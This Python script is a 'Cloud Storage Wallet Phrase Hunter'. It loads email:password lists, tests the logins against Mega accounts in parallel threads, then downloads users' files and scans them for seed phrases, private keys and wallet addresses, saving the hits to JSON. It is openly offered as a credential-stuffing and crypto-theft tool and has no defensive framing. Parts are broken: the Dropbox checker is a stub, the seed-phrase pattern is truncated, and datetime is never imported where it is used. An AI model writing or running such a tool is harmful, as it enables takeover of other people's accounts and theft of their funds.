#!/usr/bin/env python3
"""
Cloud Storage Account Checker & Wallet Phrase Hunter
Searches Dropbox, Google Drive, OneDrive, Mega for wallet files
"""

import re
import concurrent.futures
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass
import json


@dataclass
class CloudAccount:
    """Cloud storage account credentials."""
    email: str
    password: str
    service: str  # 'dropbox', 'gdrive', 'onedrive', 'mega'


@dataclass
class WalletFind:
    """Wallet phrase discovery result."""
    account: CloudAccount
    file_path: str
    wallet_type: str  # 'seed_phrase', 'private_key', 'wallet_file'
    content: str
    confidence: str  # 'high', 'medium', 'low'


class WalletPatterns:
    """Regex patterns for finding wallet-related data."""

    # 12/24 word seed phrases (BIP39)
    SEED_PHRASE_12 = re.compile(
        r'\b(?:' + '|'.join([
            'abandon', 'ability', 'able', 'about', 'above', 'absent',
            'absorb', 'abstract', 'absurd', 'abuse', 'access', 'accident',
            # ... (truncated for brevity - full BIP39 wordlist)
        ]) + r')\b(?:\s+(?:' + '|'.join([
            'abandon', 'ability', 'able'  # etc
        ]) + r')\b){11,23}',
        re.IGNORECASE
    )

    # Private keys (hex 64 chars)
    PRIVATE_KEY_HEX = re.compile(r'\b[0-9a-fA-F]{64}\b')

    # Ethereum addresses
    ETH_ADDRESS = re.compile(r'\b0x[a-fA-F0-9]{40}\b')

    # Bitcoin addresses
    BTC_ADDRESS = re.compile(
        r'\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b|'
        r'\bbc1[a-z0-9]{39,59}\b'
    )

    # Keywords indicating wallet files
    WALLET_KEYWORDS = [
        'seed phrase', 'recovery phrase', 'mnemonic',
        'private key', 'wallet.dat', 'keystore',
        'metamask', 'trust wallet', 'exodus',
        'coinbase', 'blockchain', 'bitcoin',
        'ethereum', 'crypto', 'ledger'
    ]

    @classmethod
    def scan_content(cls, content: str) -> List[Tuple[str, str, str]]:
        """
        Scan content for wallet indicators.
        Returns: List of (type, match, confidence)
        """
        findings = []

        # Check for seed phrases
        seed_matches = cls.SEED_PHRASE_12.findall(content)
        for match in seed_matches:
            findings.append(('seed_phrase', match, 'high'))

        # Check for private keys
        key_matches = cls.PRIVATE_KEY_HEX.findall(content)
        for match in key_matches:
            findings.append(('private_key', match, 'medium'))

        # Check for addresses
        eth_matches = cls.ETH_ADDRESS.findall(content)
        for match in eth_matches:
            findings.append(('eth_address', match, 'low'))

        btc_matches = cls.BTC_ADDRESS.findall(content)
        for match in btc_matches:
            findings.append(('btc_address', match, 'low'))

        # Check for wallet keywords
        content_lower = content.lower()
        for keyword in cls.WALLET_KEYWORDS:
            if keyword in content_lower:
                findings.append(('keyword', keyword, 'low'))

        return findings


class DropboxChecker:
    """Dropbox account checker and file searcher."""

    def __init__(self):
        try:
            import dropbox
            self.dropbox = dropbox
        except ImportError:
            raise ImportError("Install: pip install dropbox")

    def check_login(self, email: str, password: str) -> Tuple[bool, Optional[object]]:
        """Check Dropbox credentials and return client if valid."""
        # Note: Dropbox uses OAuth2, not email/password
        # This is a placeholder - real implementation needs OAuth flow
        try:
            # For actual use, you'd need to implement OAuth2 flow
            # or use refresh token if available
            return False, None
        except Exception as e:
            return False, None

    def search_files(self, client, patterns: List[str]) -> List[Dict]:
        """Search Dropbox for wallet-related files."""
        findings = []

        try:
            # List all files
            result = client.files_list_folder('', recursive=True)

            while True:
                for entry in result.entries:
                    if isinstance(entry, self.dropbox.files.FileMetadata):
                        # Check filename
                        filename_lower = entry.name.lower()

                        # Check for wallet-related filenames
                        if any(kw in filename_lower for kw in [
                            'wallet', 'seed', 'phrase', 'key',
                            'metamask', 'crypto', 'bitcoin'
                        ]):
                            findings.append({
                                'path': entry.path_display,
                                'name': entry.name,
                                'size': entry.size,
                                'modified': entry.client_modified
                            })

                        # Download and scan text files
                        if entry.name.endswith(('.txt', '.json', '.dat', '.key')):
                            try:
                                _, response = client.files_download(entry.path_display)
                                content = response.content.decode('utf-8', errors='ignore')

                                # Scan content
                                wallet_matches = WalletPatterns.scan_content(content)
                                if wallet_matches:
                                    findings.append({
                                        'path': entry.path_display,
                                        'name': entry.name,
                                        'matches': wallet_matches
                                    })
                            except:
                                pass

                if not result.has_more:
                    break
                result = client.files_list_folder_continue(result.cursor)

        except Exception as e:
            print(f"Error searching Dropbox: {e}")

        return findings


class MegaChecker:
    """Mega.nz account checker and file searcher."""

    def __init__(self):
        try:
            from mega import Mega
            self.mega_class = Mega
        except ImportError:
            raise ImportError("Install: pip install mega.py")

    def check_login(self, email: str, password: str) -> Tuple[bool, Optional[object]]:
        """Check Mega credentials."""
        try:
            mega = self.mega_class()
            account = mega.login(email, password)
            if account:
                return True, account
            return False, None
        except Exception as e:
            return False, None

    def search_files(self, mega_client) -> List[Dict]:
        """Search Mega for wallet-related files."""
        findings = []

        try:
            files = mega_client.get_files()

            for file_id, file_info in files.items():
                if file_info['t'] == 0:  # Is file (not folder)
                    filename = file_info.get('a', {}).get('n', '')
                    filename_lower = filename.lower()

                    # Check for wallet-related filenames
                    if any(kw in filename_lower for kw in [
                        'wallet', 'seed', 'phrase', 'key',
                        'metamask', 'crypto', 'bitcoin'
                    ]):
                        findings.append({
                            'file_id': file_id,
                            'name': filename,
                            'size': file_info.get('s', 0)
                        })

                    # Download and scan small text files
                    if filename.endswith(('.txt', '.json', '.key')):
                        size = file_info.get('s', 0)
                        if size < 1024 * 1024:  # Less than 1MB
                            try:
                                content = mega_client.get_file(file_id)
                                if isinstance(content, bytes):
                                    content = content.decode('utf-8', errors='ignore')

                                wallet_matches = WalletPatterns.scan_content(content)
                                if wallet_matches:
                                    findings.append({
                                        'file_id': file_id,
                                        'name': filename,
                                        'matches': wallet_matches
                                    })
                            except:
                                pass

        except Exception as e:
            print(f"Error searching Mega: {e}")

        return findings


class CloudStorageEngine:
    """Multi-threaded cloud storage checker."""

    def __init__(self, max_workers: int = 5):
        self.max_workers = max_workers
        self.results = []

        self.checkers = {
            'mega': MegaChecker(),
            # 'dropbox': DropboxChecker(),  # Requires OAuth setup
        }

    def check_account(self, account: CloudAccount) -> Dict:
        """Check cloud account and search for wallet data."""
        result = {
            'account': account,
            'status': 'error',
            'findings': []
        }

        checker = self.checkers.get(account.service.lower())
        if not checker:
            result['error'] = f"Service {account.service} not supported"
            return result

        # Try login
        print(f"[*] Checking {account.service}: {account.email}")
        success, client = checker.check_login(account.email, account.password)

        if success:
            result['status'] = 'valid'
            print(f"  ✓ Login successful - searching files...")

            # Search for wallet files
            findings = checker.search_files(client)
            result['findings'] = findings

            if findings:
                print(f"  ⚠ Found {len(findings)} potential wallet files!")
            else:
                print(f"  ℹ No wallet files found")
        else:
            result['status'] = 'invalid'
            print(f"  ✗ Login failed")

        return result

    def check_batch(self, accounts: List[CloudAccount]) -> List[Dict]:
        """Check multiple accounts with threading."""
        results = []

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {
                executor.submit(self.check_account, acc): acc
                for acc in accounts
            }

            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                results.append(result)

        return results

    def save_results(self, results: List[Dict], output_file: str = 'wallet_findings.json'):
        """Save findings to JSON."""
        output_data = {
            'timestamp': str(datetime.now()),
            'total_checked': len(results),
            'valid_accounts': sum(1 for r in results if r['status'] == 'valid'),
            'wallet_findings': []
        }

        for result in results:
            if result.get('findings'):
                output_data['wallet_findings'].append({
                    'service': result['account'].service,
                    'email': result['account'].email,
                    'findings': result['findings']
                })

        with open(output_file, 'w') as f:
            json.dump(output_data, f, indent=2)

        print(f"\n[✓] Results saved to {output_file}")


def main():
    """Main execution."""
    import argparse
    from datetime import datetime

    parser = argparse.ArgumentParser(
        description='Cloud Storage Wallet Phrase Hunter'
    )
    parser.add_argument('input_file', help='CSV file with credentials')
    parser.add_argument('-s', '--service', default='mega',
                       help='Service (mega, dropbox, gdrive)')
    parser.add_argument('-t', '--threads', type=int, default=5,
                       help='Number of threads')

    args = parser.parse_args()

    # Load accounts
    accounts = []
    with open(args.input_file, 'r') as f:
        for i, line in enumerate(f, 1):
            if i == 1:  # Skip header
                continue

            parts = line.strip().split('|')
            if parts:
                cred_part = parts[0].strip()
                if ':' in cred_part:
                    email, password = cred_part.split(':', 1)
                    if '@' in email:
                        accounts.append(CloudAccount(
                            email=email.strip(),
                            password=password.strip(),
                            service=args.service
                        ))

    print(f"[*] Loaded {len(accounts)} accounts")

    # Check accounts
    engine = CloudStorageEngine(max_workers=args.threads)
    results = engine.check_batch(accounts)

    # Statistics
    valid = sum(1 for r in results if r['status'] == 'valid')
    with_findings = sum(1 for r in results if r.get('findings'))

    print(f"\n{'='*60}")
    print(f"Summary:")
    print(f"  Valid logins: {valid}/{len(accounts)}")
    print(f"  Accounts with wallet files: {with_findings}")
    print(f"{'='*60}\n")

    # Save results
    engine.save_results(results)


if __name__ == '__main__':
    main()
